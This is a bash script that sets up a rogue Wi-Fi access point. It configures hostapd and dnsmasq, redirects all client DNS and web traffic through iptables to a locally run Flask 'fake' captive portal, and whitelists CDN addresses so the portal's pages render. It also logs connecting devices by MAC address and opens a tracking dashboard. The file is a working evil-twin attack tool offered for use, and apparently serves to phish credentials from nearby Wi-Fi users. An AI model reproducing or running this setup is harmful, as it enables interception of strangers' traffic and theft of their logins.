#!/bin/bash

# ─── CONFIGURATION ────────────────────────────────────────────────
IFACE="wlan0"
GATEWAY="10.0.0.1"
CERT_FILE="cert.crt"
KEY_FILE="cert.key"

# Create logs directory if it doesn't exist
mkdir -p logs

# ─── 1. Kill existing services ────────────────────────────────────
echo "[*] Stopping conflicting services..."
sudo pkill hostapd
sudo pkill dnsmasq
sudo pkill -f fake.py
sudo pkill -f http_redirect.py
sudo iptables -t nat -F
sudo iptables -F FORWARD

# ─── 2. Bring up interface ────────────────────────────────────────
echo "[*] Configuring $IFACE..."
echo "[DEBUG] Available interfaces:"
ip link show

echo "[DEBUG] Checking if $IFACE exists..."
if ! ip link show $IFACE >/dev/null 2>&1; then
    echo "[ERROR] Interface $IFACE not found. Available interfaces are:"
    ip link show | grep -o '^[0-9]: .*' | cut -d' ' -f2
    echo "Please edit IFACE variable in the script to match your wireless interface"
    exit 1
fi

# Remove existing IP if it exists
sudo ip addr del $GATEWAY/24 dev $IFACE 2>/dev/null

sudo ip link set $IFACE down
sudo iw dev $IFACE set type __ap
sudo ip addr add $GATEWAY/24 dev $IFACE
sudo ip link set $IFACE up

echo "[DEBUG] Interface configuration:"
ip addr show $IFACE

# ─── 3. Start hostapd ─────────────────────────────────────────────
echo "[*] Starting hostapd..."
echo "[DEBUG] Running hostapd with config:"
cat hostapd.conf

monitor_hostapd_events() {
    # Monitor hostapd events and send them to Flask server
    echo "[DEBUG] Starting hostapd event monitoring..."
    sudo hostapd_cli -i $IFACE -a /bin/bash -c '
        while read line; do
            if echo "$line" | grep -q "AP-STA-CONNECTED"; then
                mac=$(echo "$line" | grep -o "[0-9a-f:]\{17\}")
                curl -X POST -H "Content-Type: application/json" -d "{\"type\":\"connect\",\"mac\":\"$mac\"}" http://localhost:443/api/events
                echo "[DEBUG] Sent connect event for $mac"
            elif echo "$line" | grep -q "AP-STA-DISCONNECTED"; then
                mac=$(echo "$line" | grep -o "[0-9a-f:]\{17\}")
                curl -X POST -H "Content-Type: application/json" -d "{\"type\":\"disconnect\",\"mac\":\"$mac\"}" http://localhost:443/api/events
                echo "[DEBUG] Sent disconnect event for $mac"
            fi
        done
    ' &
}

sudo hostapd hostapd.conf &
sleep 2

# Start monitoring hostapd events
monitor_hostapd_events

# ─── 4. Start dnsmasq ─────────────────────────────────────────────
echo "[*] Starting dnsmasq..."
echo "[DEBUG] Running dnsmasq with config:"
cat dnsmasq.conf
sudo dnsmasq -C dnsmasq.conf

# ─── 5. Enable IP forwarding ──────────────────────────────────────
echo "[*] Enabling IP forwarding..."
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null

# ─── 6. Set iptables rules ────────────────────────────────────────
echo "[*] Setting iptables rules..."

# Redirect HTTP/HTTPS to Flask
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 443 -j REDIRECT --to-port 443

# NAT masquerade
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# ─── 6a. Allow CDN IPs for resources (from wlan0 to eth0) ─────────

# Bootstrap CDN
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.18.11.207 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.18.10.207 -j ACCEPT

# jQuery CDN
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.130.137 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.66.137 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.194.137 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.2.137 -j ACCEPT

# FontAwesome CDN
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.17.25.14 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.17.24.14 -j ACCEPT

# Allow response traffic from internet
sudo iptables -A FORWARD -i eth0 -o $IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT

# Block everything else from clients
sudo iptables -A FORWARD -i $IFACE -o eth0 -j DROP

# ─── 7. Start Flask servers ───────────────────────────────────────
echo "[*] Launching Flask HTTPS portal (port 443)..."
sudo python3 fake.py 2>&1 | tee logs/fake.log &

echo "[*] Launching Flask HTTP redirector (port 80)..."
sudo python3 http_redirect.py 2>&1 | tee logs/redirect.log &

# Wait a moment for servers to start
sleep 2

# Check if servers are running
echo "[DEBUG] Checking if Flask servers are running..."
if pgrep -f "python3 fake.py" > /dev/null; then
    echo "[✓] HTTPS server is running"
else
    echo "[!] ERROR: HTTPS server failed to start. Check logs/fake.log"
fi

if pgrep -f "python3 http_redirect.py" > /dev/null; then
    echo "[✓] HTTP redirector is running"
else
    echo "[!] ERROR: HTTP redirector failed to start. Check logs/redirect.log"
fi

# ─── 8. Done ──────────────────────────────────────────────────────
echo "[✓] Rogue AP is live at $GATEWAY"
echo "[✓] DNS is redirecting all domains to captive portal"
echo "[✓] CDN whitelisting is active"
echo "[✓] Created by WarrenWarren5454"

# ─── 9. Interactive Loop ──────────────────────────────────────────
while true; do
    echo ""
    echo "[*] Options:"
    echo "[1] Stop Rogue AP and Flask Servers"
    echo "[2] Open Real-Time Dashboard"

    read -p "Select an option: " choice

    if [[ "$choice" == "1" ]]; then
        echo "[*] Stopping services..."
        sudo pkill hostapd
        sudo pkill dnsmasq
        sudo pkill -f fake.py
        sudo pkill -f http_redirect.py
        sudo iptables -t nat -F
        sudo iptables -F FORWARD
        sudo ip link set $IFACE down
        echo "[✓] Rogue AP stopped."
        exit 0

    elif [[ "$choice" == "2" ]]; then
        echo "[*] Opening dashboard at http://10.0.0.1/dashboard"
        xdg-open "https://10.0.0.1/dashboard" >/dev/null 2>&1 &
    
    else
        echo "[↻] Menu refreshed. Press [1] to quit or [2] to open dashboard."
    fi
done


